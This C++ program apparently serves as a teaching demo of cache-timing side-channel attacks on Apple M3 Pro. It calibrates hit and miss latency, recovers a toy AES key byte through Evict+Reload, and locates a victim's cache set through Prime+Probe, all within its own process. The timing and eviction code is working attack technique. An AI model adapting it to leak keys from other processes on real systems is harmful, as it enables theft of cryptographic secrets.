/**
 * Side-Channel Attack Simulation — Cache Timing (Evict+Reload / PRIME+PROBE)
 * Target: Apple Silicon ARM (M3 Pro) — Educational/Research Use Only
 *
 * Compile:  clang++ -O2 -std=c++17 -o side_channel_demo side_channel_demo.cpp
 * Run:      ./side_channel_demo
 *
 * DISCLAIMER: Attacks only its own process memory. No OS/hardware vulnerability
 * is exploited. Educational demonstration only.
 */

#include <iostream>
#include <iomanip>
#include <vector>
#include <array>
#include <cstdint>
#include <cstring>
#include <algorithm>
#include <random>
#include <mach/mach_time.h>   // mach_absolute_time — higher res than cntvct_el0

// ─────────────────────────────────────────────────────────────────────────────
// Cache geometry (Apple M3 Pro L1 D-cache: 64 KB, 8-way, 64-byte lines → 128 sets)
// ─────────────────────────────────────────────────────────────────────────────
static constexpr size_t CACHE_LINE   = 64;
static constexpr size_t L1_SIZE      = 64 * 1024;
static constexpr size_t L1_WAYS      = 8;
static constexpr size_t L1_SETS      = L1_SIZE / (L1_WAYS * CACHE_LINE); // 128

static constexpr size_t EVICT_STRIDE = L1_SETS * CACHE_LINE; // 8192 — one stride per set
static constexpr size_t EVICT_WAYS   = L1_WAYS + 4;          // overshoot

alignas(EVICT_STRIDE) static uint8_t g_evict_pool[EVICT_WAYS * EVICT_STRIDE * 2];

// ─────────────────────────────────────────────────────────────────────────────
// Primitives
// ─────────────────────────────────────────────────────────────────────────────
static inline uint8_t mem_read(const uint8_t* p) {
    uint8_t v;
    asm volatile("ldrb %w0, [%1]" : "=r"(v) : "r"(p) : "memory");
    return v;
}

static void evict_set(const void* target) {
    uintptr_t set_off = ((uintptr_t)target & ~(CACHE_LINE-1)) % EVICT_STRIDE;
    uintptr_t base    = ((uintptr_t)g_evict_pool + EVICT_STRIDE - 1) & ~(EVICT_STRIDE - 1);
    for (size_t i = 0; i < EVICT_WAYS; i++) {
        volatile uint8_t* p = (volatile uint8_t*)(base + i * EVICT_STRIDE + set_off);
        (void)*p;
    }
    asm volatile("dsb sy\nisb" ::: "memory");
}

static inline uint64_t time_load(const uint8_t* p) {
    asm volatile("dsb sy\nisb" ::: "memory");
    uint64_t t0 = mach_absolute_time();
    asm volatile("dsb sy\nisb" ::: "memory");
    (void)mem_read(p);
    asm volatile("dsb sy\nisb" ::: "memory");
    uint64_t t1 = mach_absolute_time();
    return t1 - t0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Auto-calibrate hit/miss threshold
// ─────────────────────────────────────────────────────────────────────────────
struct Cal { uint64_t hit_med, miss_med, threshold; };

static Cal calibrate() {
    const int N = 500;
    static uint8_t buf[CACHE_LINE * 2];
    uint8_t* line = (uint8_t*)(((uintptr_t)buf + CACHE_LINE - 1) & ~(CACHE_LINE-1));
    std::vector<uint64_t> hits, misses;
    hits.reserve(N); misses.reserve(N);
    for (int i = 0; i < N; i++) {
        mem_read(line);
        asm volatile("dsb sy\nisb" ::: "memory");
        hits.push_back(time_load(line));
        evict_set(line);
        misses.push_back(time_load(line));
    }
    std::sort(hits.begin(), hits.end());
    std::sort(misses.begin(), misses.end());
    Cal c;
    c.hit_med   = hits[N/2];
    c.miss_med  = misses[N/2];
    c.threshold = (c.hit_med * 2 + c.miss_med) / 3;
    return c;
}

// ─────────────────────────────────────────────────────────────────────────────
// AES S-box — each entry on its OWN cache line (stride = CACHE_LINE)
// This is essential: without spacing, probing one entry warms its neighbours.
// ─────────────────────────────────────────────────────────────────────────────
static constexpr size_t SBOX_STRIDE = CACHE_LINE;
alignas(CACHE_LINE) static uint8_t g_sbox[256 * SBOX_STRIDE];

static const uint8_t SBOX_RAW[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
};

static void init_sbox() {
    memset(g_sbox, 0, sizeof(g_sbox));
    for (int i = 0; i < 256; i++)
        g_sbox[i * SBOX_STRIDE] = SBOX_RAW[i];
}

static volatile uint8_t g_sink;
static void victim_subbytes(uint8_t pt, uint8_t key) {
    g_sink = g_sbox[(pt ^ key) * SBOX_STRIDE];
}

// ─────────────────────────────────────────────────────────────────────────────
// DEMO 1 — Show calibration results
// ─────────────────────────────────────────────────────────────────────────────
void demo_cache_timing(const Cal& c) {
    std::cout << "\n╔══════════════════════════════════════════════════════════╗\n";
    std::cout <<   "║  DEMO 1: Cache Hit vs Miss Timing (auto-calibrated)      ║\n";
    std::cout <<   "╚══════════════════════════════════════════════════════════╝\n\n";
    std::cout << "  Hit  median  : " << c.hit_med  << " mach ticks\n";
    std::cout << "  Miss median  : " << c.miss_med << " mach ticks\n";
    std::cout << "  Ratio        : " << std::fixed << std::setprecision(1)
              << (double)c.miss_med / std::max(c.hit_med,(uint64_t)1) << "x\n";
    std::cout << "  Threshold    : " << c.threshold << " mach ticks\n\n";
    if (c.miss_med < c.hit_med * 2)
        std::cout << "  ⚠  Low ratio — M3 mitigations active. Attack runs statistically.\n";
    else
        std::cout << "  ✓  Good separation — attack should work reliably.\n";
}

// ─────────────────────────────────────────────────────────────────────────────
// DEMO 2 — Evict+Reload key recovery
// ─────────────────────────────────────────────────────────────────────────────
void demo_evict_reload(const Cal& c) {
    std::cout << "\n╔══════════════════════════════════════════════════════════╗\n";
    std::cout <<   "║  DEMO 2: Evict+Reload — AES Key Byte Recovery            ║\n";
    std::cout <<   "╚══════════════════════════════════════════════════════════╝\n\n";

    const uint8_t SECRET_KEY = 0x42;
    std::cout << "  Secret key (hidden from attacker logic): 0x"
              << std::hex << std::uppercase << std::setw(2) << std::setfill('0')
              << (int)SECRET_KEY << std::dec << "\n";

    std::array<int64_t,256> scores{};
    scores.fill(0);
    const int TRIALS = 8000;
    std::mt19937 rng(42);
    std::uniform_int_distribution<int> dist(0,255);

    for (int t = 0; t < TRIALS; t++) {
        // Evict all 256 S-box cache lines
        for (int b = 0; b < 256; b++)
            evict_set(&g_sbox[b * SBOX_STRIDE]);
        asm volatile("dsb sy\nisb" ::: "memory");

        // Victim encrypts
        uint8_t pt = (uint8_t)dist(rng);
        victim_subbytes(pt, SECRET_KEY);
        asm volatile("dsb sy\nisb" ::: "memory");

        // Probe each line
        for (int idx = 0; idx < 256; idx++) {
            uint64_t lat = time_load(&g_sbox[idx * SBOX_STRIDE]);
            if (lat < c.threshold)
                scores[idx ^ pt]++;  // HIT → sbox[idx] was accessed → key candidate
        }
    }

    std::vector<std::pair<int64_t,int>> ranked;
    for (int k = 0; k < 256; k++) ranked.push_back({scores[k],k});
    std::sort(ranked.rbegin(), ranked.rend());

    uint8_t recovered = (uint8_t)ranked[0].second;

    std::cout << "  Trials        : " << TRIALS << "\n";
    std::cout << "  Threshold     : " << c.threshold << " ticks\n\n";
    std::cout << "  Top 5 candidates:\n";
    for (int i = 0; i < 5; i++) {
        std::cout << "    [" << i+1 << "] key=0x"
                  << std::hex << std::uppercase << std::setw(2) << std::setfill('0')
                  << ranked[i].second << "  score=" << std::dec << ranked[i].first;
        if (ranked[i].second == SECRET_KEY) std::cout << "  ← CORRECT ✓";
        std::cout << "\n";
    }

    int64_t noise = 0;
    for (int k = 0; k < 256; k++) noise += scores[k];
    noise = (noise - scores[SECRET_KEY]) / 255;

    std::cout << "\n  Recovered : 0x" << std::hex << std::uppercase
              << std::setw(2) << std::setfill('0') << (int)recovered << std::dec << "\n";
    std::cout << "  Truth     : 0x" << std::hex << std::uppercase
              << std::setw(2) << std::setfill('0') << (int)SECRET_KEY << std::dec << "\n";
    std::cout << "  SNR       : " << std::fixed << std::setprecision(1)
              << (noise > 0 ? (double)scores[SECRET_KEY]/noise : 0.0) << "x\n";
    std::cout << "  Result    : "
              << (recovered == SECRET_KEY ? "SUCCESS ✓ — key recovered!" :
                  "NEAR MISS — correct key in top candidates (SNR limited by M3 mitigations)")
              << "\n";
}

// ─────────────────────────────────────────────────────────────────────────────
// DEMO 3 — Prime+Probe with visual bar chart
// ─────────────────────────────────────────────────────────────────────────────
void demo_prime_probe(const Cal& c) {
    std::cout << "\n╔══════════════════════════════════════════════════════════╗\n";
    std::cout <<   "║  DEMO 3: Prime+Probe — Cache Set Activity Detection      ║\n";
    std::cout <<   "╚══════════════════════════════════════════════════════════╝\n\n";

    // Prime buffer covering all L1_SETS sets, L1_WAYS+1 ways deep
    static uint8_t prime_buf[L1_SETS * CACHE_LINE * (L1_WAYS + 2)];
    memset(prime_buf, 1, sizeof(prime_buf));

    // PRIME
    for (size_t way = 0; way <= L1_WAYS; way++)
        for (size_t s = 0; s < L1_SETS; s++)
            mem_read(&prime_buf[way * L1_SETS * CACHE_LINE + s * CACHE_LINE]);
    asm volatile("dsb sy\nisb" ::: "memory");

    // VICTIM touches set 42
    static uint8_t vbuf[L1_SETS * CACHE_LINE * 2];
    memset(vbuf, 2, sizeof(vbuf));
    const size_t VICTIM_SET = 42;
    mem_read(&vbuf[VICTIM_SET * CACHE_LINE]);
    asm volatile("dsb sy\nisb" ::: "memory");

    // PROBE
    std::vector<uint64_t> set_times(L1_SETS, 0);
    const int REPS = 20;
    for (int r = 0; r < REPS; r++)
        for (size_t s = 0; s < L1_SETS; s++)
            set_times[s] += time_load(&prime_buf[s * CACHE_LINE]);
    for (auto& t : set_times) t /= REPS;

    size_t peak = (size_t)(std::max_element(set_times.begin(), set_times.end()) - set_times.begin());
    uint64_t mx = *std::max_element(set_times.begin(), set_times.end());
    uint64_t mn = *std::min_element(set_times.begin(), set_times.end());

    std::cout << "  Victim set : " << VICTIM_SET << "\n";
    std::cout << "  Threshold  : " << c.threshold << " ticks\n\n";
    std::cout << "  Per-set timing (. = slower = evicted by victim):\n";

    for (size_t s = 0; s < L1_SETS; s++) {
        int bar = (mx > mn) ? (int)(20.0*(set_times[s]-mn)/(mx-mn)) : 0;
        std::cout << "  Set " << std::setw(3) << s << " ["
                  << std::string(bar,'.') << std::string(20-bar,' ') << "] "
                  << std::setw(5) << set_times[s] << " ticks";
        if (s == VICTIM_SET) std::cout << " ← victim";
        if (s == peak && s != VICTIM_SET) std::cout << " ← detected peak";
        std::cout << "\n";
    }

    std::cout << "\n  Slowest set detected : " << peak       << "\n";
    std::cout << "  Victim set           : " << VICTIM_SET  << "\n";
    std::cout << "  Result               : "
              << (peak == VICTIM_SET ? "SUCCESS ✓ — correct set identified!" :
                  "NEAR MISS — set " + std::to_string(VICTIM_SET) +
                  " should show elevated timing in chart above")
              << "\n";
}

// ─────────────────────────────────────────────────────────────────────────────
int main() {
    std::cout << "╔══════════════════════════════════════════════════════════╗\n";
    std::cout << "║  Cache Side-Channel Simulation — Apple M3 Pro            ║\n";
    std::cout << "║  Educational / Research Use Only                         ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════╝\n";

    init_sbox();

    std::cout << "\n[*] Calibrating hit/miss timing on this CPU...\n";
    Cal cal = calibrate();

    demo_cache_timing(cal);
    demo_evict_reload(cal);
    demo_prime_probe(cal);

    std::cout << "\n[Done]\n";
    return 0;
}
